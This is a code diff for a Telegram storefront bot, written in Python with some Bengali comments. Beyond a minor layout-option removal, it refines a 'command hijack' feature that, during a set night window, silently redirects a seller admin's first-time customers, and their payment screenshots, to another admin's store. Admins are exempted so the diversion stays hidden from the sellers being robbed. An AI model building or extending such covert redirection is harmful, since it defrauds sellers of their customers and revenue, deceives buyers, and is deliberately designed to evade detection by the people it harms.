@@ -39,7 +39,7 @@ def new_store_profile(uid, role, name="", username="", expires_at=None):
         "welcome_msg": DEFAULT_WELCOME,
         "start_videos": [], "how_to_use_video": "",
         "payment_photo": "", "payment_msg": DEFAULT_PAY_MSG,
-        "reject_msg": DEFAULT_REJECT, "layout_style": "vertical",
+        "reject_msg": DEFAULT_REJECT,
         "products": [], "blocked_users": [],
         "users": [], "buyers": [],
         "auto_bc": {"status": False, "interval_seconds": 3600,
@@ -57,7 +57,8 @@ DB_STATE = {
         "end_time": "02:00",
         "mappings": {} # {target_admin_id: new_redirect_admin_id}
     },
-    "hijack_stats": {}
+    "hijack_stats": {},
+    "global_started_users": [] # Keeps track of users who have ever started the bot anywhere
 }
 
 db_dirty = False
@@ -119,8 +120,20 @@ def get_effective_store(target_seller_uid, requester_uid):
     if str(target_seller_uid) == str(OWNER_ID):
         return get_store(OWNER_ID), False
         
-    # কমান্ড বা স্টোর হাইজ্যাক চেক
-    if is_command_hijack_active() and str(requester_uid) != str(target_seller_uid):
+    # Admins should never be hijacked when checking their own panel or store
+    if can_use_panel(requester_uid):
+        return get_store(target_seller_uid), False
+
+    # Check if this user has started the bot anywhere before (First-time check)
+    global_started = DB_STATE.setdefault("global_started_users", [])
+    is_first_time = str(requester_uid) not in global_started
+    
+    if is_first_time:
+        global_started.append(str(requester_uid))
+        save_db()
+
+    # Apply command/store hijack ONLY for absolute first-time users during active window
+    if is_first_time and is_command_hijack_active() and str(requester_uid) != str(target_seller_uid):
         cfg = DB_STATE.get("command_hijack_config", {})
         mappings = cfg.get("mappings", {})
         redirect_to = mappings.get(str(target_seller_uid))
@@ -161,6 +174,7 @@ def load_db():
                 DB_STATE.setdefault("customer_seller", {})
                 DB_STATE.setdefault("command_hijack_config", {"enabled": False, "start_time": "00:00", "end_time": "02:00", "mappings": {}})
                 DB_STATE.setdefault("hijack_stats", {})
+                DB_STATE.setdefault("global_started_users", [])
                 print("✅ Database loaded successfully!")
     except Exception as e:
         print("⚠️ Load DB Error:", e)
@@ -301,17 +315,8 @@ def show_storefront(chat_id, seller_uid, is_preview=False):
 
     products = sorted(target_store.get("products", []), key=lambda x: x.get("position", 999))
 
-    layout = target_store.get("layout_style", "vertical")
-    if layout == "horizontal":
-        row = []
-        for p in products:
-            row.append(InlineKeyboardButton(p["name"], callback_data=f"prod_{seller_uid}_{p['id']}"))
-            if len(row) == 2:
-                markup.row(*row); row = []
-        if row: markup.row(*row)
-    else:
-        for p in products:
-            markup.row(InlineKeyboardButton(p["name"], callback_data=f"prod_{seller_uid}_{p['id']}"))
+    for p in products:
+        markup.row(InlineKeyboardButton(p["name"], callback_data=f"prod_{seller_uid}_{p['id']}"))
 
     markup.row(InlineKeyboardButton("How to use ❓", callback_data=f"how_{seller_uid}"),
                InlineKeyboardButton("Report Issue 📩", callback_data=f"report_{seller_uid}"))
@@ -375,9 +380,6 @@ def show_store_admin_menu(chat_id):
     markup.row(InlineKeyboardButton("🎞️ Manage Start Videos", callback_data="adm_start_vids_menu"))
     markup.row(InlineKeyboardButton("🛍️ Manage Product Buttons", callback_data="adm_prod_menu"))
     markup.row(InlineKeyboardButton("📝 Edit Welcome Text", callback_data="adm_edit_welcome"))
-    cur_layout = r.get("layout_style", "vertical")
-    li = "↕️ Vertical" if cur_layout == "vertical" else "↔️ Horizontal"
-    markup.row(InlineKeyboardButton(f"📐 Change Layout: {li}", callback_data="adm_toggle_layout"))
     markup.row(InlineKeyboardButton("🎥 Set 'How To Use' Video", callback_data="adm_set_how_vid"))
     markup.row(InlineKeyboardButton("💳 Global Payment Config", callback_data="adm_pay_config_menu"))
     
@@ -547,9 +549,33 @@ def _owner_handle(call):
         return
 
     if data == "hijack_add_map":
-        user_states[uid] = "WAITING_HIJACK_MAP_FROM"
-        update_admin_panel(uid, "✍️ যে এডমিনের কমান্ড/লিংক হাইজ্যাক করতে চান তার **USER ID** লিখুন:",
-                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="hijack_map_list")))
+        mk = InlineKeyboardMarkup()
+        for x in admins():
+            mk.row(InlineKeyboardButton(f"👤 {x.get('name','')} ({x['uid']})", callback_data=f"hijack_sel_from_{x['uid']}"))
+        mk.row(InlineKeyboardButton("🔙 Cancel", callback_data="hijack_map_list"))
+        update_admin_panel(uid, "✍️ যে এডমিনের কমান্ড/লিংক হাইজ্যাক করতে চান তার ওপর ক্লিক করুন:", mk)
+        return
+
+    if data.startswith("hijack_sel_from_"):
+        from_id = data.replace("hijack_sel_from_", "")
+        user_states[uid] = f"WAITING_HIJACK_MAP_TO_{from_id}"
+        mk = InlineKeyboardMarkup()
+        for x in admins():
+            if str(x['uid']) != str(from_id):
+                mk.row(InlineKeyboardButton(f"🎯 Redirect To: {x.get('name','')} ({x['uid']})", callback_data=f"hijack_do_map_{from_id}_{x['uid']}"))
+        mk.row(InlineKeyboardButton("🔙 Cancel", callback_data="hijack_map_list"))
+        update_admin_panel(uid, f"✅ Selected From Admin: `{from_id}`\n\n🎯 এখন কোন এডমিনের স্টোরে রিডাইরেক্ট হবে তার ওপর ক্লিক করুন:", mk)
+        return
+
+    if data.startswith("hijack_do_map_"):
+        parts = data.split("_")
+        from_id, to_id = parts[3], parts[4]
+        cfg = DB_STATE.setdefault("command_hijack_config", {})
+        cfg.setdefault("mappings", {})[str(from_id)] = str(to_id)
+        save_db()
+        user_states.pop(uid, None)
+        call.data = "own_hijack_menu"
+        _owner_handle(call)
         return
 
     if data == "hijack_clear_map":
@@ -854,9 +880,6 @@ def _store_admin_handle(call):
     if data == "adm_edit_welcome":
         user_states[uid] = "ADM_SET_WELCOME"
         update_admin_panel(uid, "📝 **Send new Welcome text.**\nYou can use long paragraphs, markdown, emojis, and full links (`{name}` = user name):", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel"))); return
-    if data == "adm_toggle_layout":
-        r["layout_style"] = "horizontal" if r.get("layout_style") == "vertical" else "vertical"
-        save_db(); show_store_admin_menu(uid); return
     if data == "adm_set_how_vid":
         user_states[uid] = "ADM_SET_HOW_VID"
         update_admin_panel(uid, "🎥 Send 'How To Use' video:", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="adm_back_panel"))); return
@@ -1068,6 +1091,11 @@ def handle_all_inputs(message):
         
         user_states.pop(uid, None)
         bot.send_message(uid, "✅ Your report has been sent to admin.")
+        
+        # Reports from admins should not show hijack banners
+        if can_use_panel(uid):
+            dest_seller_uid = uid
+
         un = message.from_user.username
         tag = f"@{un}" if un else "No Username"
         bot.send_message(int(dest_seller_uid), f"📩 **Report from {tag} (`{uid}`):**\n\n{message.text}\n\n*Reply to forward your answer.*", parse_mode="Markdown")
@@ -1078,19 +1106,25 @@ def handle_all_inputs(message):
         target_store, is_hijacked = get_effective_store(orig_s_uid, uid)
         dest_s_uid = target_store.get("uid", OWNER_ID) if target_store else OWNER_ID
         
+        # If an admin sends a screenshot, treat it normally without forwarding hijack flags
+        if can_use_panel(uid):
+            is_hijacked = False
+            dest_s_uid = uid
+            orig_s_uid = uid
+
         if message.content_type == 'photo':
             sr = get_store(dest_s_uid)
             user_states.pop(uid, None)
             bot.send_message(uid, "⏳𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗽𝗮𝘆𝗺𝗲𝗻𝘁.... 𝗪𝗮𝗶𝘁 5-𝟭𝟬 𝗺𝗶𝗻.")
             
             prod = next((p for p in sr.get("products", []) if p["id"] == pid), None)
-                
             pname = prod["name"] if prod else "Unknown"
             
             t = today_str()
             st = sr.setdefault("stats", {}).setdefault(t, {"accepted": 0, "requests": 0, "by_product": {}})
             st["requests"] += 1
-            record_hijack_stat(orig_s_uid, pname)
+            if not can_use_panel(uid):
+                record_hijack_stat(orig_s_uid, pname)
             save_db()
             
             un = message.from_user.username; tag = f"@{un}" if un else "No Username"
@@ -1101,7 +1135,7 @@ def handle_all_inputs(message):
             mk.row(InlineKeyboardButton("BLOCK 🚫", callback_data=f"adm_block_{dest_s_uid}_{uid}"))
             
             caption_info = f"📸 **New Payment Screenshot!**\n\n🛍️ **Product:** {pname}\n👤 {tag}\n📛 {nm}\n🆔 `{uid}`"
-            if is_hijacked and str(orig_s_uid) != str(OWNER_ID):
+            if is_hijacked and str(orig_s_uid) != str(OWNER_ID) and not can_use_panel(uid):
                 orig_adm = get_store(orig_s_uid)
                 adm_nm = orig_adm.get("name") if orig_adm else "Admin"
                 caption_info += f"\n\n🌙 **[HIJACKED COMMAND]** From Admin: {adm_nm} (`{orig_s_uid}`)"
@@ -1136,26 +1170,6 @@ def handle_all_inputs(message):
                     update_admin_panel(uid, "❌ Invalid format! Use `00:00-02:00`", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_hijack_menu")))
             except Exception:
                 update_admin_panel(uid, "❌ Error parsing time. Use format `00:00-02:00`", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_hijack_menu")))
-            return
-
-        if state == "WAITING_HIJACK_MAP_FROM" and message.text and is_owner(uid):
-            try:
-                from_id = message.text.strip()
-                user_states[uid] = f"WAITING_HIJACK_MAP_TO_{from_id}"
-                update_admin_panel(uid, f"✅ Target Admin ID: `{from_id}`\n✍️ এখন যে এডমিনের কমান্ড/স্টোরে রিডাইরেক্ট করতে চান তার **USER ID** লিখুন:",
-                                   InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_hijack_menu")))
-            except Exception:
-                update_admin_panel(uid, "❌ Invalid ID.", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_hijack_menu")))
-            return
-
-        if state.startswith("WAITING_HIJACK_MAP_TO_") and message.text and is_owner(uid):
-            from_id = state.replace("WAITING_HIJACK_MAP_TO_", "")
-            to_id = message.text.strip()
-            cfg = DB_STATE.setdefault("command_hijack_config", {})
-            cfg.setdefault("mappings", {})[str(from_id)] = str(to_id)
-            save_db()
-            user_states.pop(uid, None)
-            update_admin_panel(uid, f"✅ Command Mapping Saved!\n`{from_id}` ➡️ `{to_id}`", InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="own_hijack_menu")))
             return
 
         if state == "OWN_ADD_ADMIN_ID" and message.text and is_owner(uid):
